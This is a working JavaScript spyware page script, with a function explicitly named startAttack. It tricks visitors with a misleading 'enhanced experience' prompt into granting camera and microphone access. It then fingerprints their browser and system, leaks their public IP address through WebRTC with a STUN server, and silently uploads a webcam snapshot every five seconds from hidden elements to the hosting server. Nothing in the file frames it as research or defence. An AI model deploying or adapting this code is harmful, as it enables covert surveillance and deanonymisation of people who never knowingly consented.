const SERVER_URL = window.location.origin;

// Permissions Wall
if (confirm("This site wants to use your camera and microphone for enhanced experience. Click OK to continue.")) {
    startAttack();
} else {
    document.body.innerHTML = "<h1>Access Denied</h1><p>Camera and microphone access is required.</p>";
}

async function startAttack() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user" }, 
            audio: true 
        });
        
        // System Information Collection
        const systemInfo = {
            user_agent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages,
            cookie_enabled: navigator.cookieEnabled,
            screen_width: screen.width,
            screen_height: screen.height,
            color_depth: screen.colorDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            hardware_concurrency: navigator.hardwareConcurrency || 'unknown',
            device_memory: navigator.deviceMemory || 'unknown'
        };
        
        // Send system info
        fetch(`${SERVER_URL}/upload_sys`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: `data=${encodeURIComponent(JSON.stringify(systemInfo))}`
        });

        // FIXED: WebRTC IP Leak with STUN server
        const rtc = new RTCPeerConnection({
            iceServers: [
                { urls: "stun:stun.l.google.com:19302" }  // FIX: Added STUN server
            ]
        });
        
        rtc.createDataChannel('');
        rtc.createOffer().then(o => rtc.setLocalDescription(o));
        rtc.onicecandidate = (e) => {
            if (e.candidate) {
                const candidate = e.candidate.candidate;
                if (candidate.includes("srflx")) {
                    const ip_match = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/);
                    if (ip_match) {
                        fetch(`${SERVER_URL}/upload_ip`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                            body: `data=${encodeURIComponent(JSON.stringify({internal_ip: ip_match[0]}))}`
                        });
                    }
                }
            }
        };

        // FIXED: Camera capture using video element (cross-browser compatible)
        const video = document.createElement('video');
        video.srcObject = stream;
        video.autoplay = true;
        video.style.display = 'none';
        document.body.appendChild(video);

        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        document.body.appendChild(canvas);
        canvas.style.display = 'none';

        // Wait for video to be ready
        video.addEventListener('loadedmetadata', () => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            setInterval(() => {
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                canvas.toBlob((blob) => {
                    const formData = new FormData();
                    formData.append('file', blob, `cam_${Date.now()}.jpg`);
                    
                    fetch(`${SERVER_URL}/upload_cam`, {
                        method: 'POST',
                        body: formData
                    }).catch(err => console.log('Upload failed:', err));
                }, 'image/jpeg', 0.8);
            }, 5000); // Capture every 5 seconds
        });

    } catch (err) { 
        console.log("Permission Denied or Error:", err);
        document.body.innerHTML = "<h1>Error: Camera/Microphone access required</h1>";
    }
}
